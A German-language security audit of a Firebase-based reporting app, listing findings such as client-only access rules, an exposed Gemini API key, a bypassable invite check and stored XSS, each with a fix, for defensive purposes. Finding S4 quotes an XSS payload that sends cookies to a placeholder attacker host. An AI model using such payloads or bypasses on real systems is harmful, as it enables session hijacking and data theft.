# mooMemo – Sicherheitsanalyse

Stand: 2026-07-04 · Analysierte Version: 1.8.5 (index.html) + Cloud Function `callGemini`

Dieses Dokument beschreibt alle bei der Code-Prüfung gefundenen Sicherheitsmängel –
mit Fundstelle, Angriffsweg, Auswirkung und empfohlener Behebung. Die Punkte sind
nach Priorität sortiert.

> **Status-Legende:**
> 🔴 offen (Architektur-Änderung nötig) · 🟡 offen (kleiner Eingriff) · ✅ im Zuge der Stabilisierung bereits behoben

---

## S1 · 🔴 Sichtbarkeitsregeln existieren nur im Client (Kritisch)

**Fundstelle:** `index.html` → `setupRealtimeListener()` (lädt per `onSnapshot` die
komplette Collection `artifacts/{appId}/public/data/reports`), Filterung erst in
`renderReportList()` / `renderRelatedReports()`.

**Problem:** Damit der Listener funktioniert, müssen die Firestore Security Rules
jedem eingeloggten Nutzer **Lesezugriff auf alle Berichte** geben. Die gesamte
Sichtbarkeitslogik (`authors_only`, `team_only`, `selected_teams`, `all`) ist reine
UI-Filterung.

**Angriffsweg:** Die Firebase-Konfiguration (`apiKey`, `projectId` …) steht im
Quelltext der Seite und ist per Design öffentlich. Jeder Nutzer mit gültigem Login
kann mit wenigen Zeilen Firebase-SDK-Code (oder den Browser-DevTools, da `allReports`
im Speicher liegt) **alle Berichte aller Teams lesen** – inklusive `authors_only`.

**Auswirkung:** Vertraulichkeit der Berichte ist nicht gegeben. Die Funktion
suggeriert eine Schutzwirkung, die technisch nicht existiert.

**Empfehlung:**
1. Firestore Security Rules pro Dokument durchsetzen, z. B.:
   - Lesen nur wenn `request.auth.uid == resource.data.created_by`
     ODER `resource.data.header.visibility == 'all'`
     ODER Team-Abgleich über ein Custom Claim (`request.auth.token.department`).
   - Abteilung/Rolle als **Custom Claims** per Cloud Function setzen (Client-Profil
     in Firestore ist manipulierbar, solange Nutzer ihr eigenes Profil schreiben dürfen).
2. Client auf gefilterte Queries umstellen (`where('header.visibility','==','all')`,
   eigene Berichte separat), statt die ganze Collection zu abonnieren.
3. `firestore.rules` und `storage.rules` **ins Repository aufnehmen** und über
   `firebase deploy --only firestore:rules,storage` mit ausrollen. Aktuell sind die
   Regeln nicht versioniert und nicht reviewbar.

---

## S2 · 🔴 Gemini-API-Key liegt clientseitig lesbar in Firestore (Kritisch)

**Fundstelle:** `index.html` → `saveGlobalApiKey()` schreibt den Key per `setDoc`
vom Browser aus nach `artifacts/{appId}/public/data/app_config/secrets`.
`functions/index.js` liest ihn von dort.

**Problem:** Der Kommentar in `functions/index.js` („key is never sent to any
browser") stimmt nur für den Funktionsaufruf. Da der Admin den Key **aus dem
Browser** in dieses Dokument schreibt, müssen die Rules dort Schreibzugriff
erlauben – und sehr wahrscheinlich auch Lesezugriff (gleiche `public/data`-Ebene wie
Berichte und Nutzerprofile). Jeder eingeloggte Nutzer kann den Key dann per
`getDoc(...app_config/secrets)` direkt auslesen und außerhalb der App verwenden.

**Auswirkung:** Key-Diebstahl → unkontrollierte Kosten auf dem Gemini-Konto,
Quota-Verbrauch, ggf. Sperrung des Keys.

**Empfehlung:**
1. Key in den **Firebase Secret Manager** verschieben
   (`defineSecret('GEMINI_KEY')` + `onCall({ secrets: [...] })`), Firestore-Dokument
   löschen.
2. Übergangslösung: Rules so setzen, dass `app_config/secrets` **nur für Admins
   lesbar/schreibbar** ist (Admin-Prüfung über Custom Claim, nicht über das
   Firestore-Profil).
3. Bestehenden Key nach der Umstellung **rotieren** (er muss als kompromittiert
   gelten).

---

## S3 · 🔴 Einladungscode-Prüfung ist umgehbar (Hoch)

**Fundstelle:** `index.html` → `doRegister()`.

**Problem:** Der Ablauf ist: (1) Auth-Account per
`createUserWithEmailAndPassword` anlegen → (2) Code **clientseitig** gegen
`app_config/auth.invite_code` prüfen → (3) bei falschem Code den Account wieder
löschen. Beide Schritte 2 und 3 laufen im Browser des Angreifers.

**Angriffsweg:** Mit der öffentlichen Firebase-Config ruft ein Angreifer
`createUserWithEmailAndPassword` direkt auf (ohne die App-Logik) und hat einen
gültigen Account – der laut S1 alle „für alle" freigegebenen Berichte lesen kann und
die Cloud Function (S5) nutzen darf. Zusätzlich ist der Invite-Code selbst lesbar,
wenn die Rules `app_config/auth` für authentifizierte Nutzer freigeben
(`loadInviteCode()` wird nach dem Anlegen des Accounts aufgerufen, d. h. Lesezugriff
für frisch registrierte Nutzer ist Voraussetzung des aktuellen Flows).

**Auswirkung:** Registrierungsschutz wirkungslos; die `@gea.com`-Prüfung ist
ebenfalls nur clientseitig (keine E-Mail-Verifizierung).

**Empfehlung:**
1. **Blocking Function** `beforeUserCreated` (Identity Platform) oder eine Cloud
   Function als einzigen Registrierungsweg verwenden; dort Invite-Code und
   E-Mail-Domain serverseitig prüfen.
2. E-Mail-Verifizierung (`sendEmailVerification`) erzwingen und in Rules/Functions
   `request.auth.token.email_verified` prüfen.
3. Nicht freigeschaltete Accounts erhalten keinen Datenzugriff (Rules an ein
   `approved`-Custom-Claim koppeln).

---

## S4 · ✅ Stored XSS über Berichtsinhalte im PDF-Export (Hoch – behoben)

**Fundstelle:** `index.html` → `renderPDFPreviewWithData()` injizierte
`p.title`, `p.desc`, `p.ticket`, `p.assignee`, `p.solutionDate`-Umfeld,
`h.customer`, Autoren- und Teilnehmerlisten **ohne** `escapeHtml()` in `innerHTML`;
ebenso `renderRelatedReports()` (`authorsStr`) und `applySharedLinkMode()`
(Titel/Untertitel waren ok, da `textContent`).

**Angriffsweg:** Nutzer A legt einen Punkt mit Titel
`<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` an und gibt den
Bericht fürs Team frei. Öffnet Nutzer B (auch ein Admin) den Export-Tab, läuft das
Script in dessen Session – inkl. Zugriff auf dessen Firestore-Rechte.

**Auswirkung:** Session-Übernahme / Aktionen im Namen anderer Nutzer, besonders
kritisch in Kombination mit Admin-Rechten.

**Behoben:** Alle nutzergenerierten Felder im Export und in der Sidebar werden jetzt
konsequent über `escapeHtml()` ausgegeben (gleiche Behandlung wie in
`renderPointsList`/`renderReportList`). **Restrisiko:** Neue Render-Stellen müssen
dieselbe Regel einhalten – langfristig wäre eine kleine Template-Helper-Funktion
oder ein gezielter Einsatz von `textContent` robuster als String-Konkatenation.

---

## S5 · 🟡 Cloud Function ohne Missbrauchsschutz (Mittel)

**Fundstelle:** `functions/index.js` → `callGemini`.

**Problem:**
- Kein Limit der Prompt-Länge → beliebig große/teure Anfragen. *(✅ inzwischen:
  Längen-Limit 20 000 Zeichen serverseitig ergänzt.)*
- Kein Rate-Limit pro Nutzer, kein **App Check** → jeder Auth-Account (siehe S3)
  kann die Funktion in Schleife aufrufen und Kosten erzeugen.
- Keine `maxInstances`-Begrenzung → auch versehentliche Client-Schleifen skalieren
  unbegrenzt. *(✅ inzwischen: `maxInstances: 10` gesetzt.)*

**Empfehlung (offen):** Firebase **App Check** aktivieren
(`enforceAppCheck: true`), einfaches Rate-Limit pro UID (z. B. Zähler in Firestore
mit TTL oder `firebase-functions-rate-limiter`), Budget-Alarm im GCP-Projekt.

---

## S6 · 🟡 Rollen-/Adminmodell clientseitig durchsetzbar (Mittel)

**Fundstelle:** `index.html` → `isAdmin()`, `toggleUserRole()`,
`deleteUserProfile()`, `changeUserDepartment()`, `askDeleteReport()`,
`performExport()` u. a.

**Problem:** Alle Admin-Prüfungen (`window.isAdmin()`) laufen im Browser. Ob ein
Nutzer wirklich keine fremden Profile/Berichte ändern oder löschen kann, entscheidet
allein die (nicht im Repo versionierte) Rules-Datei. Legen die Rules – wie der
restliche Code nahelegt – pauschal `allow read, write: if request.auth != null` auf
`public/data` fest, kann **jeder Nutzer** Rollen ändern, Profile löschen, fremde
Berichte überschreiben oder löschen und den Invite-Code ändern. Auch die
„S-Admin"-Sonderrolle ist nur ein E-Mail-String-Vergleich im Client.

**Empfehlung:** Admin-Rolle als **Custom Claim** vergeben (Cloud Function, nur durch
bestehende Admins aufrufbar); Rules: Schreiben auf `users/{uid}` nur für den
eigenen Datensatz und ohne `role`-Feld, Rollenänderung/Löschung nur für
`request.auth.token.admin == true`; Berichte: Update/Delete nur für Ersteller,
gelistete Autoren oder Admin-Claim.

---

## S7 · 🟡 Firebase Storage: Bilder-URLs und Regeln (Mittel)

**Fundstelle:** `index.html` → `processFiles()` (Upload nach
`images/{reportId}/…`), `deleteStorageFolder()`, `deleteStorageImages()`.

**Problem:**
- Download-URLs enthalten ein Token und werden ungekürzt im Berichts-Dokument
  gespeichert – wer den Bericht lesen kann (laut S1: alle), kann alle Bilder laden.
  Das Token bleibt auch nach Entzug der Berichts-Sichtbarkeit gültig.
- `storage.rules` sind nicht im Repo; vermutlich pauschales
  `read/write: if request.auth != null` → jeder Nutzer kann fremde Bilder löschen
  oder beliebige Dateien hochladen (keine Größen-/Typ-Beschränkung serverseitig).

**Empfehlung:** Storage Rules versionieren; Schreibzugriff auf
`images/{reportId}/**` an Berichtsrechte koppeln (oder mindestens
`request.resource.size < 5 * 1024 * 1024` und `contentType.matches('image/.*')`).

---

## S8 · 🟡 CI/CD: Umgang mit dem Service-Account-Key (Niedrig–Mittel)

**Fundstelle:** `.github/workflows/deploy-functions.yml`.

**Problem:**
- `echo '${{ secrets.FIREBASE_SERVICE_ACCOUNT }}' > /tmp/sa.json` – das Secret wird
  durch die Shell interpoliert; ein Hochkomma im JSON bricht den Schritt, und das
  Muster ist anfällig, das Secret in Logs zu leaken (z. B. bei `set -x`).
- Ein langlebiger Service-Account-Key als GitHub-Secret ist ein stehendes Risiko.

**Empfehlung:** `google-github-actions/auth` mit **Workload Identity Federation**
(keyless) verwenden; mindestens aber das Secret über `env:` in eine Datei schreiben
(`printf '%s' "$SA_JSON" > …`) und den Key regelmäßig rotieren.

---

## S9 · ℹ️ Weitere Beobachtungen (Niedrig)

| # | Fundstelle | Beobachtung |
|---|-----------|-------------|
| 1 | `index.html` (CDN-Einbindungen) | `heic2any` und Font Awesome werden ohne **Subresource Integrity** (`integrity`/`crossorigin`) von CDNs geladen. Ein kompromittiertes CDN könnte Code in die App einschleusen. SRI-Hashes ergänzen oder Bibliotheken selbst hosten. |
| 2 | `doPasswordReset()` | Kein echter Reset-Flow (nur Hinweistext). `sendPasswordResetEmail` ist bereits importiert – ein Klick-zu-Mail-Flow wäre sicherer als manuelles „Konto zurücksetzen und neu registrieren". |
| 3 | `exportSingleReport()` / `performExport()` | Backup-JSON enthält alle Berichte inkl. interner IDs und Bild-URLs mit Token – Exportdateien entsprechend vertraulich behandeln (Hinweis im UI wäre sinnvoll). |
| 4 | Login | Kein Schutz gegen Credential-Stuffing außer Firebase-Default (`too-many-requests`). MFA/SSO (Microsoft Entra über `SAMLAuthProvider`/`OAuthProvider`) wäre für einen Firmenkontext die sauberere Lösung. |
| 5 | `console.log` | Diverse Debug-Ausgaben (Version, Storage-Cleanup-Pfade). Kein direktes Risiko, aber unnötige Informationspreisgabe. |

---

## Empfohlene Reihenfolge der Umsetzung

1. **S2** Key in Secret Manager + Key-Rotation (kleinster Eingriff, größter Schaden abgewendet)
2. **S1 + S6 + S7** Firestore/Storage-Rules ins Repo, Rechte-Modell mit Custom Claims (eine zusammenhängende Baustelle)
3. **S3** Registrierung serverseitig absichern
4. **S5** App Check + Rate-Limit
5. **S8, S9** CI-Härtung und Kleinigkeiten
